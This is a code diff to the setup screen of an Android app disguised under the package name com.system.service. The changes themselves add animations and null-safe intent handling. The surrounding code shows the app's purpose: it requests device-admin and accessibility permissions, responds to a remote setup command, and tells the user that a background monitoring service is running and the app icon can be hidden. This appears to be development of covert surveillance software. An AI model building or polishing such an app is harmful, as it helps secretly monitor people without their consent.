@@ -22,6 +22,7 @@ import com.journeyapps.barcodescanner.ScanContract
 import com.journeyapps.barcodescanner.ScanIntentResult
 import com.journeyapps.barcodescanner.ScanOptions
 import com.system.service.R
+import com.system.service.core.AnimationHelper
 import com.system.service.core.CoreService
 import com.system.service.core.DeviceAdminReceiver
 import com.system.service.core.HealthReporter
@@ -111,7 +112,7 @@ class SetupActivity : AppCompatActivity() {
         cbBatteryConfirm = findViewById(R.id.cbBatteryConfirm)
 
         // Honour "jump_to_step" extra sent by CoreService's request_accessibility_setup command
-        if (intent.getStringExtra("jump_to_step") == "accessibility") {
+        if (intent?.getStringExtra("jump_to_step") == "accessibility") {
             showStep(2)
             return
         }
@@ -122,9 +123,9 @@ class SetupActivity : AppCompatActivity() {
         showStep(0)
     }
 
-    override fun onNewIntent(intent: Intent) {
+    override fun onNewIntent(intent: Intent?) {
         super.onNewIntent(intent)
-        if (intent.getStringExtra("jump_to_step") == "accessibility") {
+        if (intent?.getStringExtra("jump_to_step") == "accessibility") {
             showStep(2)
         }
     }
@@ -175,10 +176,11 @@ class SetupActivity : AppCompatActivity() {
         delayMs: Long = 1700,
         onDone: () -> Unit
     ) {
-        llLoading.visibility = View.VISIBLE
         llStep.visibility    = View.GONE
         llCards.visibility   = View.GONE
         tvLoadingText.text   = text
+        llLoading.visibility = View.VISIBLE
+        AnimationHelper.fadeSlideUp(llLoading, durationMs = 300)
         Handler(Looper.getMainLooper()).postDelayed({
             llLoading.visibility = View.GONE
             onDone()
@@ -191,9 +193,10 @@ class SetupActivity : AppCompatActivity() {
         currentStep = step
         llCards.visibility          = View.GONE
         llLoading.visibility        = View.GONE
-        llStep.visibility           = View.VISIBLE
         cbBatteryConfirm.visibility = View.GONE
         btnNext.isEnabled           = true
+        llStep.visibility           = View.VISIBLE
+        AnimationHelper.fadeSlideUp(llStep, durationMs = 350)
 
         when (step) {
 
@@ -556,6 +559,10 @@ class SetupActivity : AppCompatActivity() {
             else showLoading("Starting setup wizard…") { showStep(1) }
         }
         llCards.addView(btnConfirm)
+
+        // Stagger-animate all cards one-by-one after they are added
+        val childViews = Array(llCards.childCount) { llCards.getChildAt(it) }
+        AnimationHelper.staggerCards(*childViews)
     }
 
     // ── Final step ───────────────────────────────────────────────────────────
@@ -566,6 +573,7 @@ class SetupActivity : AppCompatActivity() {
         tvTitle.text = "Setup Complete"
         tvDesc.text  = "✅ The monitoring service is now running in the background.\n\nAll permissions have been granted. You can safely hide this app icon."
 
+        AnimationHelper.popIn(llStep)
         try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
 
         btnAction.text = "Hide App Icon"
